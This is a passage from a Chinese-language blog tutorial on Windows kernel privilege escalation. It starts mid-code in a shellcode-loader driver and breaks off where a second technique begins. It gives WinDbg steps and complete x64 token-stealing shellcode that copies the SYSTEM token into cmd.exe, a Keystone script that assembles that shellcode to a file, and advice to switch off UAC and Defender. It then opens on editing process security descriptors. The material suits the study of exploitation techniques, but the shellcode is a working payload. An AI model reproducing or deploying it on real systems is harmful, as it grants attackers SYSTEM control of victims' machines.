class="line">exit_scldrWrite:</span><br><span class="line">    <span class="keyword">if</span> (took_mutex)</span><br><span class="line">    &#123;</span><br><span class="line">        ExReleaseFastMutex(&amp;dev_ext-&gt;mutex);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Irp-&gt;IoStatus.Information = len;</span><br><span class="line">    Irp-&gt;IoStatus.Status = nts;</span><br><span class="line">    IoCompleteRequest(Irp, IO_NO_INCREMENT);</span><br><span class="line">    <span class="keyword">return</span> nts;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>IRP_MJ_DEVICE_CONTROL</code>irp主要响应如下几个控制代码：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOCTL_kscldr_setmaxlength \</span></span><br><span class="line">    CTL_CODE( \</span><br><span class="line">            FILE_DEVICE_UNKNOWN, \</span><br><span class="line">            KSCLDR_FUNCTION_SET_MAX_LENGTH, \</span><br><span class="line">            METHOD_BUFFERED, \</span><br><span class="line">            FILE_WRITE_DATA \</span><br><span class="line">       )</span><br><span class="line"></span><br><span class="line"><span class="comment">// 是否在执行shellcode之前设置断点，方便调试</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOCTL_kscldr_setbreakpointdisposition \</span></span><br><span class="line">    CTL_CODE( \</span><br><span class="line">            FILE_DEVICE_UNKNOWN, \</span><br><span class="line">            KSCLDR_FUNCTION_SET_BREAKPOINT_DISPOSITION, \</span><br><span class="line">            METHOD_BUFFERED, \</span><br><span class="line">            FILE_WRITE_DATA \</span><br><span class="line">       )</span><br><span class="line"><span class="comment">// 调用shellcode</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOCTL_kscldr_callsc \</span></span><br><span class="line">    CTL_CODE( \</span><br><span class="line">            FILE_DEVICE_UNKNOWN, \</span><br><span class="line">            KSCLDR_FUNCTION_CALL, \</span><br><span class="line">            METHOD_BUFFERED, \</span><br><span class="line">            FILE_EXECUTE \</span><br><span class="line">       )</span><br></pre></td></tr></table></figure>

<p>至于其他的双机调试环境和此工具的使用方法就不再细说了，可以查看其他的windows内核调试教程。</p>
<h2 id="方法一：Token窃取"><a href="#方法一：Token窃取" class="headerlink" title="方法一：Token窃取"></a>方法一：Token窃取</h2><p>token窃取是windows内核提权最常用的办法，其核心的原理是用<code>system</code>进程中的token替换当前漏洞利用进程的token，实现身份伪造。运行中的Windows进程所关联的用户帐户和访问权限由一个叫做令牌（token）的内核对象仲裁。用于跟踪各种特定进程数据的内核数据结构包含了一个指向token的指针。当进程试图去执行各种操作时，比如打开一个文件，token中的账户权限会用于和所需的权限进行比较，以此决定该操作是否可行。</p>
<p>因为token指针只是内核内存中的数据，对于在内核模式中执行的代码来说，将其更改为指向不同的token以赋予该进程一个不同的权限集，这是非常容易的事情。接下来我们就先用windbg进行效果演示，将普通用户权限的<code>cmd.exe</code> 进程修改为<code>system</code> 权限。</p>
<h3 id="使用windbg修改提权"><a href="#使用windbg修改提权" class="headerlink" title="使用windbg修改提权"></a>使用windbg修改提权</h3><p>首先先获取<code>system</code>进程的<code>EPROCESS</code>地址：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; !<span class="built_in">process</span> <span class="number">0</span> <span class="number">0</span> system </span><br><span class="line">PROCESS ffffa98848069080</span><br><span class="line">    SessionId: none  Cid: <span class="number">0004</span>    Peb: <span class="number">00000000</span>  ParentCid: <span class="number">0000</span></span><br><span class="line">    DirBase: <span class="number">001</span>ad002  ObjectTable: ffffcc077de05d40  HandleCount: <span class="number">2486.</span></span><br><span class="line">    Image: System</span><br></pre></td></tr></table></figure>

<p>下面查看<code>EPROCESS</code>的数据：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt _EPROCESS  ffffa98848069080  </span><br><span class="line">ntdll!_EPROCESS</span><br><span class="line">   +<span class="number">0x000</span> Pcb              : _KPROCESS</span><br><span class="line">   +<span class="number">0x2e0</span> ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   ..... </span><br><span class="line">   +<span class="number">0x358</span> ExceptionPortState : <span class="number">0</span>y000</span><br><span class="line">   +<span class="number">0x360</span> Token            : _EX_FAST_REF</span><br><span class="line">   +<span class="number">0x368</span> MmReserved       : <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>可以看到<code>Token</code>是一个<code>_EX_FAST_REF</code>结构，这是windows，它依赖于一种假定，在16字节的边界上需要将内核数据结构对齐到内存中。这意味着一个指向token或其他任何内核对象的指针最低的4个位永远都是0（十六进制就是最后一个数永远为0）。Windows因此可以自由的使用该指针的低4位用于其他目的（在本例中为可用于内部优化的引用计数)。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt _EX_FAST_REF</span><br><span class="line">ntdll!_EX_FAST_REF</span><br><span class="line">   +<span class="number">0x000</span> Object           : Ptr64 Void</span><br><span class="line">   +<span class="number">0x000</span> RefCnt           : Pos <span class="number">0</span>, <span class="number">4</span> Bits</span><br><span class="line">   +<span class="number">0x000</span> Value            : Uint8B</span><br></pre></td></tr></table></figure>

<p>只需要将<code>_EX_FAST_REF</code>的数据低4bit置零，就可以获取到token的数据结构了。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// eprocess 偏移为 0x360 的位置存储的是token ，这个偏移与其他版本的windows有区别</span></span><br><span class="line"><span class="number">0</span>: kd&gt; dq ffffa98848069080 + <span class="number">0x360</span>  L1  </span><br><span class="line">ffffa988`<span class="number">480693e0</span>  ffffcc07`<span class="number">7</span>de0772d</span><br><span class="line"><span class="comment">// 将最后 4bit 置 0</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; !token ffffcc07`<span class="number">7</span>de07720 </span><br><span class="line">_TOKEN <span class="number">0xffffcc077de07720</span></span><br><span class="line">TS Session ID: <span class="number">0</span></span><br><span class="line">User: S<span class="number">-1</span><span class="number">-5</span><span class="number">-18</span></span><br><span class="line">User Groups: </span><br><span class="line"> <span class="number">00</span> S<span class="number">-1</span><span class="number">-5</span><span class="number">-32</span><span class="number">-544</span></span><br><span class="line">    Attributes - Default Enabled Owner </span><br><span class="line"> <span class="number">01</span> S<span class="number">-1</span><span class="number">-1</span><span class="number">-0</span></span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> <span class="number">02</span> S<span class="number">-1</span><span class="number">-5</span><span class="number">-11</span></span><br><span class="line">    Attributes - Mandatory Default Enabled </span><br><span class="line"> <span class="number">03</span> S<span class="number">-1</span><span class="number">-16</span><span class="number">-16384</span></span><br><span class="line">    Attributes - GroupIntegrity GroupIntegrityEnabled </span><br><span class="line">Primary Group: S<span class="number">-1</span><span class="number">-5</span><span class="number">-18</span></span><br><span class="line">Privs: </span><br><span class="line"> <span class="number">02</span> <span class="number">0x000000002</span> SeCreateTokenPrivilege            Attributes - </span><br><span class="line"> <span class="number">03</span> <span class="number">0x000000003</span> SeAssignPrimaryTokenPrivilege     Attributes - </span><br><span class="line"> <span class="number">04</span> <span class="number">0x000000004</span> SeLockMemoryPrivilege             Attributes - Enabled Default </span><br><span class="line"> <span class="number">05</span> <span class="number">0x000000005</span> SeIncreaseQuotaPrivilege          Attributes - </span><br><span class="line"> <span class="number">07</span> <span class="number">0x000000007</span> SeTcbPrivilege                    Attributes - Enabled Default </span><br><span class="line"> <span class="number">08</span> <span class="number">0x000000008</span> SeSecurityPrivilege               Attributes - </span><br><span class="line"> <span class="number">09</span> <span class="number">0x000000009</span> SeTakeOwnershipPrivilege          Attributes - </span><br><span class="line"> <span class="number">10</span> <span class="number">0x00000000a</span> SeLoadDriverPrivilege             Attributes - </span><br><span class="line"> <span class="number">11</span> <span class="number">0x00000000b</span> SeSystemProfilePrivilege          Attributes - Enabled Default </span><br><span class="line"> <span class="number">12</span> <span class="number">0x00000000c</span> SeSystemtimePrivilege             Attributes - </span><br><span class="line"> <span class="number">13</span> <span class="number">0x00000000d</span> SeProfileSingleProcessPrivilege   Attributes - Enabled Default </span><br><span class="line"> <span class="number">14</span> <span class="number">0x00000000e</span> SeIncreaseBasePriorityPrivilege   Attributes - Enabled Default </span><br><span class="line"> <span class="number">15</span> <span class="number">0x00000000f</span> SeCreatePagefilePrivilege         Attributes - Enabled Default </span><br><span class="line"> <span class="number">16</span> <span class="number">0x000000010</span> SeCreatePermanentPrivilege        Attributes - Enabled Default </span><br><span class="line"> <span class="number">17</span> <span class="number">0x000000011</span> SeBackupPrivilege                 Attributes - </span><br><span class="line"> <span class="number">18</span> <span class="number">0x000000012</span> SeRestorePrivilege                Attributes - </span><br><span class="line"> <span class="number">19</span> <span class="number">0x000000013</span> SeShutdownPrivilege               Attributes - </span><br><span class="line"> <span class="number">20</span> <span class="number">0x000000014</span> SeDebugPrivilege                  Attributes - Enabled Default </span><br><span class="line"> <span class="number">21</span> <span class="number">0x000000015</span> SeAuditPrivilege                  Attributes - Enabled Default </span><br><span class="line"> <span class="number">22</span> <span class="number">0x000000016</span> SeSystemEnvironmentPrivilege      Attributes - </span><br><span class="line"> <span class="number">23</span> <span class="number">0x000000017</span> SeChangeNotifyPrivilege           Attributes - Enabled Default </span><br><span class="line"> <span class="number">25</span> <span class="number">0x000000019</span> SeUndockPrivilege                 Attributes - </span><br><span class="line"> <span class="number">28</span> <span class="number">0x00000001c</span> SeManageVolumePrivilege           Attributes - </span><br><span class="line"> <span class="number">29</span> <span class="number">0x00000001d</span> SeImpersonatePrivilege            Attributes - Enabled Default </span><br><span class="line"> <span class="number">30</span> <span class="number">0x00000001e</span> SeCreateGlobalPrivilege           Attributes - Enabled Default </span><br><span class="line"> <span class="number">31</span> <span class="number">0x00000001f</span> SeTrustedCredManAccessPrivilege   Attributes - </span><br><span class="line"> <span class="number">32</span> <span class="number">0x000000020</span> SeRelabelPrivilege                Attributes - </span><br><span class="line"> <span class="number">33</span> <span class="number">0x000000021</span> SeIncreaseWorkingSetPrivilege     Attributes - Enabled Default </span><br><span class="line"> <span class="number">34</span> <span class="number">0x000000022</span> SeTimeZonePrivilege               Attributes - Enabled Default </span><br><span class="line"> <span class="number">35</span> <span class="number">0x000000023</span> SeCreateSymbolicLinkPrivilege     Attributes - Enabled Default </span><br><span class="line"> <span class="number">36</span> <span class="number">0x000000024</span> SeDelegateSessionUserImpersonatePrivilege  Attributes - Enabled Default </span><br><span class="line">Authentication ID:         (<span class="number">0</span>,<span class="number">3e7</span>)</span><br><span class="line">Impersonation Level:       Anonymous</span><br><span class="line">TokenType:                 Primary</span><br><span class="line">Source: *SYSTEM*           TokenFlags: <span class="number">0x2000</span> ( Token NOT in use ) </span><br><span class="line">Token ID: <span class="number">3</span>eb              ParentToken ID: <span class="number">0</span></span><br><span class="line">Modified ID:               (<span class="number">0</span>, <span class="number">3</span>ec)</span><br><span class="line">RestrictedSidCount: <span class="number">0</span>      RestrictedSids: <span class="number">0x0000000000000000</span></span><br><span class="line">OriginatingLogonSession: <span class="number">0</span></span><br><span class="line">PackageSid: (null)</span><br><span class="line">CapabilityCount: <span class="number">0</span>      Capabilities: <span class="number">0x0000000000000000</span></span><br><span class="line">LowboxNumberEntry: <span class="number">0x0000000000000000</span></span><br><span class="line">Security Attributes:</span><br><span class="line">Invalid AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION with no claims</span><br><span class="line"><span class="built_in">Process</span> Token TrustLevelSid: S<span class="number">-1</span><span class="number">-19</span><span class="number">-1024</span><span class="number">-8192</span></span><br></pre></td></tr></table></figure>

<p>可以看到system的权限跟这个数据一致。</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/20210821195011.png" alt=""></p>
<p>下一步就是定位<code>cmd.exe</code>进程的<code>_EPROCESS</code>结构并替换偏移0x360的token指针值为System的token地址。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; !<span class="built_in">process</span> <span class="number">0</span> <span class="number">0</span> cmd.exe </span><br><span class="line">PROCESS ffffa988480e30c0</span><br><span class="line">    SessionId: <span class="number">1</span>  Cid: <span class="number">07b</span>c    Peb: a26a142000  ParentCid: <span class="number">1340</span></span><br><span class="line">    DirBase: <span class="number">9</span>a1f6002  ObjectTable: ffffcc0783789d80  HandleCount:  <span class="number">70.</span></span><br><span class="line">    Image: cmd.exe</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>: kd&gt; eq ffffa988480e30c0 + <span class="number">0x360</span>   ffffcc07`<span class="number">7</span>de07720</span><br></pre></td></tr></table></figure>

<p>然后看一下cmd.exe的权限，发现已经提权成功了。</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/20210821195838.png" alt=""></p>
<h3 id="写shellcode"><a href="#写shellcode" class="headerlink" title="写shellcode"></a>写shellcode</h3><p>按照上面的思路，首先需要获取到进程的<code>EPROCESS</code>结构体的地址，在内核中可以获取到<code>EPROCESS</code>结构的函数是<code>PsGetCurrentProcess</code></p>
<p><img src="https://pic.wonderkun.cc//uploads/note/20210821200447.png" alt=""></p>
<p>我们反汇编这个函数的代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; uf PsGetCurrentProcess </span><br><span class="line">nt!PsGetCurrentProcess:</span><br><span class="line">fffff802`<span class="number">41</span>abe0e0 <span class="number">65488b</span>042588010000 mov   rax,qword ptr gs:[<span class="number">188</span>h]</span><br><span class="line">fffff802`<span class="number">41</span>abe0e9 <span class="number">488b</span>80b8000000  mov     rax,qword ptr [rax+<span class="number">0B</span>8h]</span><br><span class="line">fffff802`<span class="number">41</span>abe0f0 c3              ret</span><br></pre></td></tr></table></figure>

<p>其实<code>gs:[188h]</code>的位置存贮的是<code>_KTHREAD</code>结构的地址，看一下这个结构，发现0x220的位置存储的就是<code>_KPROCESS</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; dt _KTHREAD   </span><br><span class="line">ntdll!_KTHREAD</span><br><span class="line">   +<span class="number">0x000</span> Header           : _DISPATCHER_HEADER</span><br><span class="line">   ......</span><br><span class="line">   +<span class="number">0x220</span> <span class="built_in">Process</span>          : Ptr64 _KPROCESS</span><br><span class="line">   +<span class="number">0x228</span> UserAffinity     : _GROUP_AFFINITY</span><br></pre></td></tr></table></figure>

<p>但是函数<code>PsGetCurrentProcess</code>取的数据是 <code>0xb8</code>偏移的数据，其实这两个位置指向的是同一个数据。<code>_KTHREAD</code> 0x98偏移位置是<code>ApcStateFill</code>，其实存储的结构是<code>_KAPC_STATE</code>，<code>0x20</code>位置存储的就是<code>_KPROCESS</code>。</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; dt _KTHREAD   </span><br><span class="line">ntdll!_KTHREAD</span><br><span class="line">   +<span class="number">0x000</span> Header           : _DISPATCHER_HEADER</span><br><span class="line">   ......</span><br><span class="line">+<span class="number">0x098</span> ApcStateFill     : [<span class="number">43</span>] UChar</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; dt _KAPC_STATE  </span><br><span class="line">ntdll!_KAPC_STATE</span><br><span class="line">   +<span class="number">0x000</span> ApcListHead      : [<span class="number">2</span>] _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x020</span> <span class="built_in">Process</span>          : Ptr64 _KPROCESS </span><br><span class="line">   +<span class="number">0x028</span> InProgressFlags  : UChar</span><br><span class="line">   +<span class="number">0x028</span> KernelApcInProgress : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x028</span> SpecialApcInProgress : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x029</span> KernelApcPending : UChar</span><br><span class="line">   +<span class="number">0x02a</span> UserApcPendingAll : UChar</span><br><span class="line">   +<span class="number">0x02a</span> SpecialUserApcPending : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x02a</span> UserApcPending   : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br></pre></td></tr></table></figure>

<p>所以如下两段汇编代码都可以获取到当前进程的的<code>_KPROCESS</code>：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov r9, qword ptr gs:[0x188]</span><br><span class="line">mov r9, qword ptr[r9+0x220]</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov r9, qword ptr gs:[0x188]</span><br><span class="line">mov r9, qword ptr[r9+0x0B8]</span><br></pre></td></tr></table></figure>

<p>我们想修改的是cmd.exe的权限，但是这样获得的仅仅是cmd.exe启动的提权的进程的<code>_KPROCESS</code>，接下里需要去找其父进程cmd.exe的<code>_KPROCESS</code>位置。接下里看一下<code>_EPROCESS</code>的结构：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; dt _EPROCESS  </span><br><span class="line">ntdll!_EPROCESS</span><br><span class="line">   +<span class="number">0x000</span> Pcb              : _KPROCESS</span><br><span class="line">   +<span class="number">0x2e0</span> ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +<span class="number">0x2e8</span> UniqueProcessId  : Ptr64 Void</span><br><span class="line">   +<span class="number">0x308</span> RefTraceEnabled  : Pos <span class="number">9</span>, <span class="number">1</span> Bit</span><br><span class="line">   ....</span><br><span class="line">   +<span class="number">0x3e8</span> InheritedFromUniqueProcessId : Ptr64 Void</span><br></pre></td></tr></table></figure>

<p><code>UniqueProcessId</code> 存储的是当前进程的pid，<code>InheritedFromUniqueProcessId</code>存储的是父进程的pid。</p>
<p>在这里其实有一个疑问，我们获取的其实是<code>_KPROCESS</code>的地址，但需要的是<code>_EPROCESS</code>的地址，这怎么处理呢？</p>
<p>其实<code>_KPROCESS</code> 和<code>_EPROCESS</code> 指向的是同一个结构，这个从<code>_EPROCESS</code>的定义中就可以看出来，<code>_EPROCESS</code>是包含了<code>_KPROCESS</code>的结构体，他们的起始地址是一样的。</p>
<p>现在我们可以获取到cmd.exe的进程id，接下里需要获取到cmd.exe进程的 <code>_EPROCESS</code>,这里需要另外一个知识，windows系统中的所有进程<code>_KPROCESS</code>是使用一个双向链表进行管理的，链表元素就是<code>ActiveProcessLinks</code>，接下来遍历这个链表就可以找到cmd.exe的<code>_KPROCESS</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntdll!_EPROCESS</span><br><span class="line">   +0x000 Pcb              : _KPROCESS</span><br><span class="line">   +0x2e0 ProcessLock      : _EX_PUSH_LOCK</span><br><span class="line">   +0x2e8 UniqueProcessId  : Ptr64 Void</span><br><span class="line">   +0x2f0 ActiveProcessLinks : _LIST_ENTRY</span><br><span class="line"></span><br><span class="line">1: kd&gt; dt _LIST_ENTRY</span><br><span class="line">ntdll!_LIST_ENTRY</span><br><span class="line">   +0x000 Flink            : Ptr64 _LIST_ENTRY</span><br><span class="line">   +0x008 Blink            : Ptr64 _LIST_ENTRY</span><br></pre></td></tr></table></figure>

<p>代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov r9, qword ptr gs:[0x188]  ; stores KTHREAD value</span><br><span class="line">mov r9, qword ptr[r9+0x220]  ; stores EPROCESS as an offset to KTHREAD</span><br><span class="line">mov r8, [r9+0x3e8]                ;stores InheritedFromUniqueProcessId (cmd.exe PID)</span><br><span class="line">mov rax, r9                       ;moves current EPROCESS into eax</span><br><span class="line">loop1:</span><br><span class="line">  mov rax,qword ptr [rax + 0x2f0]          ;saves the next linked list pointer into rax</span><br><span class="line">  sub rax, 0x2f0                  ;gets the KPROCESS</span><br><span class="line">  cmp [rax + 0x2e8],r8            ;compare the ProcessId with cmd&#39;s.</span><br><span class="line">  jne loop1                       ;if not equal, repeat</span><br></pre></td></tr></table></figure>

<p>cmd.exe 的 <code>_KPROCESS</code> 地址就存储在<code>rax</code> 中。</p>
<p>接下来再遍历一遍<code>_KPROCESS</code>，读取<code>system</code>进程的token，替换掉cmd.exe进程的。<code>system</code>进程在系统中的pid恒定为4，根据这个来找：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov rdx,rax</span><br><span class="line">add rdx,0x360  ; 存储cmd.exe的token的地址</span><br><span class="line">mov rax,r9</span><br><span class="line">loop2:  ; 找system进程的 KTHREAD</span><br><span class="line">	mov rax,qword ptr [rax + 0x2f0]          ;saves the next linked list pointer into rax</span><br><span class="line">	sub rax, 0x2f0                  ;gets the KPROCESS</span><br><span class="line">	cmp  byte ptr [rax + 0x2e8],4            ;compare the ProcessId with cmd&#39;s.</span><br><span class="line">    jne loop2</span><br><span class="line">mov rcx,rax </span><br><span class="line">add rcx,0x360 ; 获取system的token地址</span><br><span class="line">mov rbx, [rcx] ; 读取token的内容</span><br><span class="line">mov [rdx],rbx ; 写进cmd.exe</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<p>接下来使用<code>Keystone</code>进行编译，测试:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> keystone <span class="keyword">as</span> k</span><br><span class="line"></span><br><span class="line">CODE = <span class="string">"""</span></span><br><span class="line"><span class="string">mov r9, qword ptr[r9+0x220]  </span></span><br><span class="line"><span class="string">mov r8, [r9+0x3e8]               </span></span><br><span class="line"><span class="string">mov rax, r9                     </span></span><br><span class="line"><span class="string">loop1:</span></span><br><span class="line"><span class="string">  mov rax,qword ptr [rax + 0x2f0]         </span></span><br><span class="line"><span class="string">  sub rax, 0x2f0                 </span></span><br><span class="line"><span class="string">  cmp [rax + 0x2e8],r8           </span></span><br><span class="line"><span class="string">  jne loop1                      </span></span><br><span class="line"><span class="string">mov rdx,rax</span></span><br><span class="line"><span class="string">add rdx,0x360 </span></span><br><span class="line"><span class="string">mov rax,r9</span></span><br><span class="line"><span class="string">loop2:  </span></span><br><span class="line"><span class="string">	mov rax,qword ptr [rax + 0x2f0]       </span></span><br><span class="line"><span class="string">	sub rax, 0x2f0                </span></span><br><span class="line"><span class="string">	cmp  byte ptr [rax + 0x2e8],4  </span></span><br><span class="line"><span class="string">    jne loop2</span></span><br><span class="line"><span class="string">mov rcx,rax </span></span><br><span class="line"><span class="string">add rcx,0x360 </span></span><br><span class="line"><span class="string">mov rbx, [rcx]  </span></span><br><span class="line"><span class="string">mov [rdx],rbx </span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">mov r9,qword ptr gs:[0x188] capstone支持的不好，汇编出来的是不对的</span></span><br><span class="line"><span class="string">不要问我为什么，我也想知道为什么 .....</span></span><br><span class="line"><span class="string">有时间了去看看keystone的源代码了，看能不能修</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># CODE = """mov r9,qword ptr gs:[0x188]"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"></span><br><span class="line">    ks = k.Ks(k.KS_ARCH_X86, k.KS_MODE_64)</span><br><span class="line">    encoding, count = ks.asm(CODE)</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">       补充 mov r9,qword ptr gs:[0x188] 的的操作码</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    read_gs = [ <span class="number">0x65</span> ,<span class="number">0x4C</span>, <span class="number">0x8B</span> ,<span class="number">0x0C</span>,<span class="number">0x25</span>, <span class="number">0x88</span> ,<span class="number">0x01</span> ,<span class="number">0x00</span> ,<span class="number">0x00</span> ]</span><br><span class="line">    encoding = read_gs + encoding</span><br><span class="line">    print(encoding)</span><br><span class="line">    <span class="comment"># print("%s = %s (number of statements: %u)" %(CODE, encoding, count))</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">"shellcode.bin"</span>,<span class="string">"wb"</span>) <span class="keyword">as</span> fd:</span><br><span class="line">        fd.write( bytes( encoding ) )</span><br><span class="line"><span class="keyword">except</span> k.KsError  <span class="keyword">as</span> e:</span><br><span class="line">    print(<span class="string">"ERROR: %s"</span> %e)</span><br></pre></td></tr></table></figure>

<p>记得关闭系统的UAC和windows defender，最后测试结果如下，提权成功 ：</p>
<p><img src="https://pic.wonderkun.cc//uploads/note/20210822195418.png" alt=""></p>
<p>windows defender的内存扫描可以把这个shellcode判黑，还是挺厉害的。</p>
<h2 id="方法二：编辑ACL-ACE"><a href="#方法二：编辑ACL-ACE" class="headerlink" title="方法二：编辑ACL/ACE"></a>方法二：编辑ACL/ACE</h2><p>此方法在2012年就提出了，主要思想是编辑一个高权限的系统进程的<code>SecurityDescriptor</code>，将它修改为NULL，这样会导致一个低权限的用户能够修改和编辑高权限的进程，然后进行进程注入，弹出具有system权限的shell。但是直接将 <code>SecurityDescriptor</code> 置0的操作已经被windows patch了。虽然直接修改为NULL会造成蓝屏，但是这并不意味着我们不能修改<code>SecurityDescriptor</code>, 我们可以修改的ACL列表，让任意用户可以访问此进程。不过这意味着之前一个内核中的一个任意地址置零就可以利用的漏洞，现在必须通过任意地址写才可以利用了。</p>
<p>我们先将<code>SecurityDescriptor</code> 修改为0，看一下会发生什么：</p>
<p>首先windows的内核对象前都有一个 <code>_object_header</code>的结构，它的大小是0x30:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1: kd&gt; dt _object_header</span><br><span class="line">nt!_OBJECT_HEADER</span><br><span class="line">   +0x000 PointerCount     : Int8B</span><br><span class="line">   +0x008 HandleCount      : Int8B</span><br><span class="line">   +0x008 NextToFree       : Ptr64 Void</span><br><span class="line">   +0x010 Lock             : _EX_PUSH_LOCK</span><br><span class="line">   +0x018 TypeIndex        : UChar</span><br><span class="line">   +0x019 TraceFlags       : UChar</span><br><span class="line">   +0x019 DbgRefTrace      : Pos 0, 1 Bit</span><br><span class="line">   +0x019 DbgTracePermanent : Pos 1, 1 Bit</span><br><span class="line">   +0x01a InfoMask         : UChar</span><br><span class="line">   +0x01b Flags            : UChar</span><br><span class="line">   +0x01b NewObject        : Pos 0, 1 Bit</span><br><span class="line">   +0x01b KernelObject     : Pos 1, 1 Bit</span><br><span class="line">   +0x01b KernelOnlyAccess : Pos 2, 1 Bit</span><br><span class="line">   +0x01b ExclusiveObject  : Pos 3, 1 Bit</span><br><span class="line">   +0x01b PermanentObject  : Pos 4, 1 Bit</span><br><span class="line">   +0x01b DefaultSecurityQuota : Pos 5, 1 Bit</span><br><span class="line">   +0x01b SingleHandleEntry : Pos 6, 1 Bit</span><br><span class="line">   +0x01b DeletedInline    : Pos 7, 1 Bit</span><br><span class="line">   +0x01c Reserved         : Uint4B</span><br><span class="line">   +0x020 ObjectCreateInfo : Ptr64 _OBJECT_CREATE_INFORMATION</span><br><span class="line">   +0x020 QuotaBlockCharged : Ptr64 Void</span><br><span class="line">   +0x028 SecurityDescriptor : Ptr64 Void</span><br><span class="line">   +0x030 Body             : _QUAD</span><br></pre></td></tr></table></figure>

<p>所以 <code>_EPROCESS</code>向前0x30的位置，就是进程对象的<code>_object_header</code>:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">1: kd&gt; !process 0 0 winlogon.exe </span><br><span class="line">PROCESS ffffb78f2b0d3140</span><br><span class="line">    SessionId: 1  Cid: 0260    Peb: 6336452000  ParentCid: 01f8</span><br><span class="line">    DirBase: 12b8fd002  ObjectTable: ffff900849cfc180  HandleCount: 257.</span><br><span class="line">    Image: winlogon.exe</span><br><span class="line">    </span><br><span class="line">1: kd&gt; dt _object_header ffffb78f2b0d3140-30 </span><br><span class="line">nt!_OBJECT_HEADER</span><br><span class="line">   +0x000 PointerCount     : 0n458557</span><br><span class="line">   ....</span><br><span class="line">   +0x028 SecurityDescriptor : 0xffff9008&#96;464082a1 Void</span><br><span class="line">   +0x030 Body             : _QUAD</span><br></pre></td></tr></table></figure>

<p>将<code>SecurityDescriptor</code> 修改为NULL，就会直接蓝屏了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1: kd&gt; eq  ffffb78f2b0d3140-30+28 0  </span><br><span class="line">1: kd&gt; g</span><br><span class="line">KDTARGET: Refreshing KD connection</span><br><span class="line"></span><br><span class="line">*** Fatal System Error: 0x00000189</span><br><span class="line">                       (0xFFFFB78F2B0D3110,0xFFFFB78F272AF380,0x0000000000000001,0x0000000000000000)</span><br><span class="line"></span><br><span class="line">Break instruction exception - code 80000003 (first chance)</span><br><span class="line"></span><br><span class="line">A fatal system error has occurred.</span><br><span class="line">Debugger entered on first try; Bugcheck callbacks have not been invoked.</span><br><span class="line"></span><br><span class="line">A fatal system error has occurred.</span><br><span class="line"></span><br><span class="line">For analysis of this file, run !analyze -v</span><br><span class="line">nt!DbgBreakPointWithStatus:</span><br><span class="line">fffff800&#96;3afc4580 cc              int     3</span><br></pre></td></tr></table></figure>

<p>这就直接蓝屏了。</p>
<h3 id="使用windbg进行调试"><a href="#使用windbg进行调试" class="headerlink" title="使用windbg进行调试"></a>使用windbg进行调试</h3><p>我们接下里开始正确的思路，进行的步骤是：</p>
